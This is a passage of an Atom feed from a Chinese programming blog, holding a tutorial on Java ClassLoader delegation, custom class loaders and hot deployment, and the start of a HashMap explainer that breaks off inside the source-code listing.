<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sanstyle</title>
  <subtitle>功有所不全 才有所不任 力有所不足</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.sanstylemc.cn/"/>
  <updated>2018-08-02T03:05:53.336Z</updated>
  <id>http://www.sanstylemc.cn/</id>
  
  <author>
    <name>MC</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ClassLoader工作机制</title>
    <link href="http://www.sanstylemc.cn/2018/08/02/ClassLoader%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6/"/>
    <id>http://www.sanstylemc.cn/2018/08/02/ClassLoader工作机制/</id>
    <published>2018-08-02T02:58:29.000Z</published>
    <updated>2018-08-02T03:05:53.336Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ClassLoader翻译过来就是类加载器，ClassLoader的具体作用就是将class文件加载到JVM虚拟机中去，程序就可以正确运行了。但是，JVM启动的时候，并不会一次性加载所有的class文件，而是根据需要去动态加载。<br><a id="more"></a></p>
<h2 id="Class文件"><a href="#Class文件" class="headerlink" title="Class文件"></a>Class文件</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>class</code>文件时字节码格式文件，Java虚拟机并不能直接识别我们平常编写的Java源文件，所以需要<code>javac</code>这个命令转换成<code>.class</code>文件。另外，如果用C或者python编写的程序正确转换成class文件后，Java虚拟机也是可以识别运行的。</p>
<h2 id="ClassLoader概念"><a href="#ClassLoader概念" class="headerlink" title="ClassLoader概念"></a>ClassLoader概念</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>ClassLoader</code>是用来动态的加载class文件到虚拟机中，并转换成<code>java.lang.class</code>类的一个实例，每个这样的实例用来表示一个Java类，我们可以根据class的实例得到该类的信息，并通过实例的<code>newInstance()</code>方法创建出该类的一个对象，除此之外，<code>ClassLoader</code>还负责加载Java应用所需的资源，如图像文件和配置文件等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>ClassLoader</code>类是一个抽象类。如果给定类的二进制名称，那么类加载器会试图查找或生成构成类定义的数据。一般策略是将名称转换为某个文件名，然后从文件系统读取该名称的”类文件”。<code>ClassLoader</code>类使用委托模型来搜索类和资源。每个<code>ClassLoader</code>实例都有一个相关的父类加载器。需要查找类或资源时，<code>ClassLoader</code>实例会在试图亲自查找类或资源之前，将搜索类或资源的任务委托给其父类加载器。</p>
<h2 id="JVM平台提供三层classLoader"><a href="#JVM平台提供三层classLoader" class="headerlink" title="JVM平台提供三层classLoader"></a>JVM平台提供三层classLoader</h2><h3 id="Bootstrap-classLoader"><a href="#Bootstrap-classLoader" class="headerlink" title="Bootstrap classLoader"></a>Bootstrap classLoader</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;采用native code实现，是JVM的一部分，主要加载JVM自身工作需要的类，如<code>java.lang.*</code>、<code>java.util.*</code>等；这些类位于<code>%JAVA_HOME%/jre/lib/rt.jar</code>。<code>Bootstrap ClassLoader</code>不继承自<code>ClassLoader</code>，因为它不是一个普通的Java类，底层由C++编写，已嵌入到了JVM内核当中，当JVM启动后，<code>BootStrap ClassLoader</code>也随着启动，负责加载完核心类库后，并构造<code>Extension ClassLoader</code>和<code>App ClassLoader</code>类加载器。</p>
<h3 id="ExtClassLoader"><a href="#ExtClassLoader" class="headerlink" title="ExtClassLoader"></a>ExtClassLoader</h3><p>扩展的<code>class loader</code>， 加载位于<code>%JAVA_HOME%/jre/lib/ext</code>目录下的扩展<code>jar</code>。</p>
<h3 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;系统<code>class loader</code>， 父类是<code>ExtClassLoader</code>，加载<code>CLASSPATH</code>下的目录和<code>jar</code>；它负责加载应用程序主函数类。<br>其体系结构如下：<br><img src="https://github.com/sunstady/hexo/blob/master/ClassLoader/1.png?raw=true" alt="1"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果要实现自己的类加载器，不管是实现抽象列<code>ClassLoader</code>，还是继承<code>URLClassLoader</code>类，它的父加载器都是<code>AppClassLoader</code>，因为不管调用哪个父类加载器，创建的对象都必须最终调用<code>getSystemClassLoader()</code>作为父加载器，<code>getSystemClassLoader()</code>方法获取到的正是<code>AppClassLoader</code>。</p>
<blockquote>
<p>注：<code>Bootstrap classLoader</code>并不属于JVM的等级层次，它不遵守<code>ClassLoader</code>的加载规则，<code>Bootstrap classLoader</code>并没有子类。</p>
</blockquote>
<h3 id="加载顺序"><a href="#加载顺序" class="headerlink" title="加载顺序"></a>加载顺序</h3><p>1、<code>Bootstrap CLassloder</code><br>2、<code>Extention ClassLoader</code><br>3、<code>AppClassLoader</code></p>
<h2 id="JVM加载class文件到内存有两种方式"><a href="#JVM加载class文件到内存有两种方式" class="headerlink" title="JVM加载class文件到内存有两种方式"></a>JVM加载class文件到内存有两种方式</h2><h3 id="隐式加载"><a href="#隐式加载" class="headerlink" title="隐式加载"></a>隐式加载</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不通过在代码里调用<code>ClassLoader</code>来加载需要的类，而是通过JVM来自动加载需要的类到内存，例如：当类中继承或者引用某个类时，JVM在解析当前这个类不在内存中时，就会自动将这些类加载到内存中。</p>
<h3 id="显示加载"><a href="#显示加载" class="headerlink" title="显示加载"></a>显示加载</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在代码中通过<code>CLassLoader</code>类来加载一个类，例如调用<code>this.getClass.getClassLoader().loadClass()</code>或者<code>Class.for</code></p>
<h2 id="ClassLoader加载类的过程"><a href="#ClassLoader加载类的过程" class="headerlink" title="ClassLoader加载类的过程"></a>ClassLoader加载类的过程</h2><p>1、找到<code>.class</code>文件并把这个文件加载到内存中。<br>2、字节码验证，<code>Class</code>类数据结构分析，内存分配和符号表的链接。<br>3、类中静态属性和初始化赋值以及静态代码块的执行。</p>
<h2 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h2><h3 id="为何要自定义类加载器"><a href="#为何要自定义类加载器" class="headerlink" title="为何要自定义类加载器"></a>为何要自定义类加载器</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JVM提供的类加载器，只能加载指定目录的<code>jar</code>和<code>class</code>，如果我们想加载其他位置的类或者<code>jar</code>时，例如加载网络上的一个<code>class</code>文件，默认的<code>ClassLoader</code>就不能满足我们的需求了，所以需要定义自己的类加载器。</p>
<h3 id="如何实现自定义的类加载器"><a href="#如何实现自定义的类加载器" class="headerlink" title="如何实现自定义的类加载器"></a>如何实现自定义的类加载器</h3><p>我们实现一个<code>ClassLoader</code>，并指定这个<code>ClassLoader</code>的加载路径。有两种方式：</p>
<h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><p>继承<code>CLassLoader</code>，重写父类的<code>findClass()</code>方法，代码如下：<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.<span class="keyword">File</span>;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> PathClassLoader <span class="keyword">extends</span> ClassLoader</div><div class="line">&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String drive = <span class="string">"d:/"</span>;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String fileType = <span class="string">".class"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception</div><div class="line">    &#123;</div><div class="line">        PathClassLoader loader = <span class="keyword">new</span> PathClassLoader();</div><div class="line">        <span class="keyword">Class</span>&lt;?&gt; objClass = loader.loadClass(<span class="string">"HelloWorld"</span>, <span class="keyword">true</span>);</div><div class="line">        Object obj = objClass.newInstance();</div><div class="line">        System.out.<span class="keyword">println</span>(objClass.getName());</div><div class="line">        System.out.<span class="keyword">println</span>(objClass.getClassLoader());</div><div class="line">        System.out.<span class="keyword">println</span>(obj.getClass().toString());</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">Class</span>&lt;?&gt; findClass(String name)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">byte</span>[] data = loadClassData(name);</div><div class="line">        <span class="keyword">return</span> defineClass(name, data, <span class="number">0</span>, data.length);<span class="comment">// 将一个 byte 数组转换为 Class// 类的实例</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] loadClassData(String name)</div><div class="line">    &#123;</div><div class="line">        FileInputStream fis = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">byte</span>[] data = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            fis = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> <span class="keyword">File</span>(drive + name + fileType));</div><div class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">            <span class="keyword">int</span> ch = <span class="number">0</span>;</div><div class="line">            <span class="keyword">while</span> ((ch = fis.<span class="keyword">read</span>()) != -<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                baos.<span class="keyword">write</span>(ch);</div><div class="line">            &#125;</div><div class="line">            data = baos.toByteArray();</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e)</div><div class="line">        &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> data;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>

</div></div><br>在第13行，我们调用了父类的<code>loadClass()</code>方法，该方法使用指定的二进制名称来加载类，下面是<code>loadClass</code>方法的源代码：<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="keyword">Class</span>&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name))</div><div class="line">        &#123;</div><div class="line">            <span class="comment">// 第一步先检查这个类是否已经被加载</span></div><div class="line">            <span class="keyword">Class</span>&lt;?&gt; c = findLoadedClass(name);</div><div class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">long</span> t0 = System.nanoTime();</div><div class="line">                <span class="keyword">try</span></div><div class="line">                &#123;</div><div class="line">                    <span class="comment">//parent为父加载器</span></div><div class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>)</div><div class="line">                    &#123;</div><div class="line">                        <span class="comment">//将搜索类或资源的任务委托给其父类加载器</span></div><div class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</div><div class="line">                    &#125; <span class="keyword">else</span></div><div class="line">                    &#123;</div><div class="line">                        <span class="comment">//检查该class是否被BootstrapClassLoader加载</span></div><div class="line">                        c = findBootstrapClassOrNull(name);</div><div class="line">                    &#125;</div><div class="line">                &#125; </div><div class="line">                <span class="keyword">catch</span> (ClassNotFoundException e)</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></div><div class="line">                    <span class="comment">// from the non-null parent class loader</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>)</div><div class="line">                &#123;</div><div class="line">                    <span class="comment">//如果上述两步均没有找到加载的class，则调用findClass()方法</span></div><div class="line">                    <span class="keyword">long</span> t1 = System.nanoTime();</div><div class="line">                    c = findClass(name);</div><div class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></div><div class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</div><div class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</div><div class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (resolve)</div><div class="line">            &#123;</div><div class="line">                resolveClass(c);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> c;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>

</div></div><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个方法首先检查指定<code>class</code>是否已经被加载，如果已被加载过，则调用<code>resolveClass()</code>方法链接指定的类，如果还未加载，则先将搜索类或资源的任务委托给其他父类加载器，检查该<code>class</code>是否被<code>BootstrapClassLoader</code>加载，如果上述两部均没有找到加载的<code>class</code>，则调用<code>findClass()</code>方法，在我们自定义的加载器中，我们重写了<code>findClass</code>方法，去我们指定的路径下加载<code>class</code>文件。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外，我们自定义的类加载器没有指定父加载器，在JVM规范中不指定父类加载器的情况下，默认采用系统类加载器即<code>AppClassLoader</code>作为其父加载器，所以在使用该自定义类加载器时，需要加载的类不能在类路径中，否则的话根据双亲委派模型的原则，待加载的类会由类加载器加载。如果一定想要把自定义加载器需要加载的类放在类路径中，就要把自定义类加载器的父加载器设置为null。</p>
<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p>继承<code>URLClassLoader</code>类，然后设置自定义路径的URL来加载URL下的类。<br>我们将指定的目录转换为URL路径，然后重写<code>findClass</code>方法。</p>
<h2 id="实现类的热部署"><a href="#实现类的热部署" class="headerlink" title="实现类的热部署"></a>实现类的热部署</h2><h3 id="什么是类的热部署"><a href="#什么是类的热部署" class="headerlink" title="什么是类的热部署"></a>什么是类的热部署</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所谓热部署，就是在应用正在运行的时候升级软件，不需要重新启用应用。<br>对于Java应用程序来说，热部署就是运行时更新Java类文件。在基于Java的应用服务器实现热部署的过程中，类装入器扮演着重要的角色。大多数基于Java的应用服务器，包括EJB服务器和Servlet容器，都支持热部署。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;类装入器不能重新装入一个已经装入的类，但只要使用一个新的类装入器实例，就可以将类再次装入一个正在运行的应用程序。</p>
<h3 id="如何实现Java类的热部署"><a href="#如何实现Java类的热部署" class="headerlink" title="如何实现Java类的热部署"></a>如何实现Java类的热部署</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前面的分析，我们已经知道，JVM在加载类之前会检查请求的类是否已经被加载过来，也就是要调用findLoadedClass方法查看是否能够返回类实例。如果类已经加载过来，再调用loadClass会导致类冲突。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，JVM判断一个类是否是同一个类有两个条件：一是看这个类的完整类名是否一样(包括包名)，二是看加载这个类的ClassLoader加载器是否是同一个(既是是同一个ClassLoader类的两个实例，加载同一个类也会不一样)。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，要实现类的热部署可以创建不同的ClassLoader的实例对象，然后通过这个不同的实例对象来加载同名的类。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ClassLoader翻译过来就是类加载器，ClassLoader的具体作用就是将class文件加载到JVM虚拟机中去，程序就可以正确运行了。但是，JVM启动的时候，并不会一次性加载所有的class文件，而是根据需要去动态加载。&lt;br&gt;
    
    </summary>
    
    
      <category term="Interview" scheme="http://www.sanstylemc.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>HashMap</title>
    <link href="http://www.sanstylemc.cn/2018/08/01/HashMap/"/>
    <id>http://www.sanstylemc.cn/2018/08/01/HashMap/</id>
    <published>2018-08-01T07:42:08.000Z</published>
    <updated>2018-08-01T09:15:27.639Z</updated>
    
    <content type="html"><![CDATA[<p>哈希表(hash table)也叫散列表，是一种非常重要的数据结构，应用场景及其丰富，许多缓存技术(比如memcached)的核心其实就是在内存中维护一张答的哈希表，而HahsMap的实现原理也常常出现在各类的面试题中，重要性可见一斑。<br><a id="more"></a></p>
<h2 id="HashMap介绍"><a href="#HashMap介绍" class="headerlink" title="HashMap介绍"></a>HashMap介绍</h2><h3 id="HashMap简介"><a href="#HashMap简介" class="headerlink" title="HashMap简介"></a>HashMap简介</h3><p><code>HashMap</code>是一个散列表，它存储的内容是键值对(key-value)映射。<br><code>HashMap</code>继承于<code>AbstractMap</code>，实现了<code>Map</code>、<code>Cloneable</code>、<code>java.io.Serializable</code>接口。<br><code>HashMap</code>的实现不是同步的，这意味这它不是线程安全的。它的<code>key</code>、<code>value</code>都可以为null。此外，<code>HashMap</code>中的映射不是有序的。<br><code>HashMap</code>的实例有两个参数影响其性能：<code>初始容量</code>和<code>加载因子</code>。容量是哈希表中桶的数量，初始容量只是哈希表在创建时的容量。加载因子是哈希表在其容量自动增加之前可以达到多满的一种尺度。当哈希表中的条目超出了加载因子与当前容量的乘积时，则要对该哈希表进行<code>rehash</code>操作(即重建内部数据结构)，从而哈希表将具有大约两倍的桶数。<br>通常，<code>默认加载因子是0.75</code>，这是在时间和空间成本上寻求一种折衷，加载因子过高虽然减少了空间开销，但同时也增加了查询成本(在大多数HashMap类的操作中，包括<code>get</code>和<code>put</code>操作，都反映了这一点)。在设置初始容量时应该考虑到映射中所需的条目数及其加载因子，以便最大限度地减少<code>rehash</code>操作次数。如果初始容量大于最大条目数除以加载因子，则不会发生<code>rehash</code>操作。</p>
<h3 id="HashMap的构造函数"><a href="#HashMap的构造函数" class="headerlink" title="HashMap的构造函数"></a>HashMap的构造函数</h3><p><code>HashMap</code>共有4个构造函数，如下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 默认构造函数。</span></div><div class="line"><span class="function"><span class="title">HashMap</span><span class="params">()</span></span></div><div class="line"><span class="comment">// 指定“容量大小”的构造函数</span></div><div class="line"><span class="function"><span class="title">HashMap</span><span class="params">(int capacity)</span></span></div><div class="line"><span class="comment">// 指定“容量大小”和“加载因子”的构造函数</span></div><div class="line"><span class="function"><span class="title">HashMap</span><span class="params">(int capacity, float loadFactor)</span></span></div><div class="line"><span class="comment">// 包含“子Map”的构造函数</span></div><div class="line"><span class="function"><span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; map)</span></span></div></pre></td></tr></table></figure></p>
<h3 id="HashMap的API"><a href="#HashMap的API" class="headerlink" title="HashMap的API"></a>HashMap的API</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span>                 <span class="built_in">clear</span>()</div><div class="line"><span class="keyword">Object</span>               clone()</div><div class="line"><span class="built_in">boolean</span>              containsKey(<span class="keyword">Object</span> <span class="built_in">key</span>)</div><div class="line"><span class="built_in">boolean</span>              containsValue(<span class="keyword">Object</span> value)</div><div class="line">Set&lt;Entry&lt;K, V&gt;&gt;     entrySet()</div><div class="line">V                    <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>)</div><div class="line"><span class="built_in">boolean</span>              isEmpty()</div><div class="line">Set&lt;K&gt;               keySet()</div><div class="line">V                    put(K <span class="built_in">key</span>, V value)</div><div class="line"><span class="keyword">void</span>                 putAll(Map&lt;? extends K, ? extends V&gt; <span class="built_in">map</span>)</div><div class="line">V                    remove(<span class="keyword">Object</span> <span class="built_in">key</span>)</div><div class="line"><span class="built_in">int</span>                  <span class="built_in">size</span>()</div><div class="line">Collection&lt;V&gt;        values()</div></pre></td></tr></table></figure>
<h2 id="HashMap数据结构"><a href="#HashMap数据结构" class="headerlink" title="HashMap数据结构"></a>HashMap数据结构</h2><h3 id="HashMap的继承关系"><a href="#HashMap的继承关系" class="headerlink" title="HashMap的继承关系"></a>HashMap的继承关系</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">java<span class="selector-class">.lang</span><span class="selector-class">.Object</span></div><div class="line">   ↳     java<span class="selector-class">.util</span><span class="selector-class">.AbstractMap</span>&lt;K, V&gt;</div><div class="line">         ↳     java<span class="selector-class">.util</span><span class="selector-class">.HashMap</span>&lt;K, V&gt;</div><div class="line"></div><div class="line">public class HashMap&lt;K,V&gt;</div><div class="line">    extends AbstractMap&lt;K,V&gt;</div><div class="line">    implements Map&lt;K,V&gt;, Cloneable, Serializable &#123; &#125;</div></pre></td></tr></table></figure>
<p><code>HashMap与Map关系如下图</code>：<br><img src="https://github.com/sunstady/hexo/blob/master/HashMap/1.jpg?raw=true" alt="1"><br>从图中可以看出：<br>1) <code>HashMap</code>继承于<code>AbstractMap</code>类，实现了Map接口。Map是”key-value键值对”接口，<code>AbstractMap</code>实现了”键值对”的通用函数接口。<br>2) <code>HashMap</code>是通过”拉链法”实现的哈希表。它包括几个重要的成员变量：<code>table</code>, <code>size</code>, <code>threshold</code>, <code>loadFactor</code>, <code>modCount</code>。<br><code>table</code>是一个<code>Entry[]</code>数组类型，而<code>Entry</code>实际上就是一个单向链表。哈希表的”key-value键值对”都是存储在”Entry”数组中的。<br><code>size</code>是<code>HashMap</code>的大小，它是<code>HashMap</code>保存的键值对的数量。<code>threshold</code>是<code>HashMap</code>的阈值，用于判断是否需要调整<code>HashMap</code>的容量。<code>threshold</code>的值=”容量*加载因子”， 当<code>HashMap</code>中存储数据的数量达到<code>threshold</code>时，就需要将<code>HashMap</code>的容量加倍。<br><code>loadFactor</code>就是加载因子。<br><code>modCount</code>是用来实现<code>fail-fast</code>机制的。</p>
<h2 id="HashMap源码解析-基于JDK1-6-0-45"><a href="#HashMap源码解析-基于JDK1-6-0-45" class="headerlink" title="HashMap源码解析(基于JDK1.6.0_45)"></a>HashMap源码解析(基于JDK1.6.0_45)</h2><p>为了更了解HashMap的原理，下面对HashMap源码代码作出分析。<br>在阅读源码时，建议参考后面的说明来建立对HashMap的整体认识，这样更容易理解HashMap。<br><div><div class="fold_hider"><div class="close hider_title">点击显/隐</div></div><div class="fold">
<figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div 